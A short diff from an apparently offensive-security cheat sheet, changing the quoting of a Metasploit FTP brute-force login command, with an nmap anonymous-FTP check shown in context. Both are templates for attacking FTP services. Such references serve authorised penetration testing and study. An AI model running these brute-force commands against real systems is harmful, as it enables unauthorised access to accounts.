@@ -36,6 +36,6 @@ nmap -v -p 21 --script=ftp-anon.nse <ip>
 ## ftp - msf bruteforce login
 #cat/ATTACK/BRUTEFORCE-SPRAY
 ```
-msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <password_file>; exploit"
+msfconsole -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <password_file>; exploit'
 ```
 
